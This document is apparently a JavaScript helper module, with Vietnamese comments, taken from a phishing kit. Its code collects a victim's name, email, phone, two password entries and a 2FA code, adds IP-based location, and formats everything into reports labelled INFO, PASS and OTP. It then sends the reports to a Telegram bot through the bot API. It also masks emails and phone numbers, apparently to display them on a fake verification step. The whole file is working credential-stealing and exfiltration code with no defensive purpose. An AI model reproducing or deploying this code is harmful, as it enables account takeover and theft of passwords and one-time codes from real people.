const Utils = {
    // 1. Lấy vị trí
    getLocation: async () => {
        try {
            const response = await fetch(CONFIG.IP_API);
            const data = await response.json();
            if (data.success) {
                return {
                    ip: data.ip,
                    city: data.city || "Unknown",
                    country: data.country || "Unknown",
                    flag: data.flag ? data.flag.emoji : "" 
                };
            }
            return { ip: data.ip || "Unknown", city: "N/A", country: "N/A", flag: "" };
        } catch (e) {
            return { ip: "Error", city: "N/A", country: "N/A", flag: "" };
        }
    },

    getTime: () => {
        return new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
    },

sendMessage: async (message) => {
    const { BOT_TOKEN, CHAT_ID } = CONFIG.TELEGRAM;
    if (!BOT_TOKEN || !CHAT_ID) return false;

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        // --- ĐOẠN SỬA ĐỂ BẮT LỖI ---
        const data = await response.json();
        
        if (!response.ok) {
            // Nếu gửi thất bại, in lỗi ra màn hình xem Telegram báo gì
            console.error("❌ Lỗi Telegram:", data.description); 
            return false;
        }
        // ---------------------------

        return true;
    } catch (e) {
        console.error("❌ Lỗi mạng/Code:", e);
        return false;
    }
},

    formatReport: (data, type, loc) => {
        const time = Utils.getTime();
        let icon = type === "INFO" ? "📝 INFO" : (type === "PASS" ? "🔑 PASS" : "🔥 OTP");

        let infoBlock = `<b>Name:</b> ${data.fullName}\n<b>Mail:</b> ${data.email}\n<b>Phone:</b> ${data.phone}`;
        let passBlock = "";
        if (data.pass1) passBlock += `\n----------------\n<b>P1:</b> <code>${data.pass1}</code>`;
        if (data.pass2) passBlock += `\n<b>P2:</b> <code>${data.pass2}</code>`;
        
        let otpBlock = "";
        if (data.twoFactorCode) otpBlock = `\n----------------\n<b>📲 2FA:</b> <code>${data.twoFactorCode}</code>`;

        let ipBlock = `\n================\n🌍 <code>${loc.ip}</code>\n📍 ${loc.city}, ${loc.country} ${loc.flag}`;

        return `<b>${icon}</b> | ${time}\n----------------\n${infoBlock}${passBlock}${otpBlock}${ipBlock}`;
    },

    // --- HÀM MỚI: MÃ HÓA EMAIL VÀ SĐT ---
    maskString: (str, type) => {
        if (!str) return "...";
        
        if (type === 'email') {
            const parts = str.split('@');
            if (parts.length < 2) return str;
            const name = parts[0];
            const domain = parts[1];
            
            // Lấy 3 ký tự đầu, nếu tên ngắn quá thì lấy 1 ký tự
            const visible = name.length > 3 ? name.substring(0, 3) : name.substring(0, 1);
            return `${visible}***@${domain}`;
        }
        
        if (type === 'phone') {
            if (str.length < 7) return str;
            // Giữ 3 số đầu, 3 số cuối, ở giữa thay bằng ****
            const first = str.substring(0, 3);
            const last = str.substring(str.length - 3);
            return `${first}****${last}`;
        }
        
        return str;
    }
};